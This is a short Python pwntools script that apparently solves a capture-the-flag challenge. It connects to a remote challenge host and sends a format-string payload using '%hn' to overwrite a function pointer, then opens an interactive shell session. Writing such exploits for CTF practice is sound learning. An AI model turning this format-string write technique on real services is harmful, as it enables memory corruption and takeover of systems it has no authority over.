#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

exe = ELF('./challenge.bin')

host, port = "challenges1.thcon.party", "519"

p = remote(host,port)

# format string we rewrite function pointer
p.sendlineafter('nom : ', '%c'*5+'%5574c'+'%hn')
p.sendlineafter('): ', 'A'*100)

p.interactive()

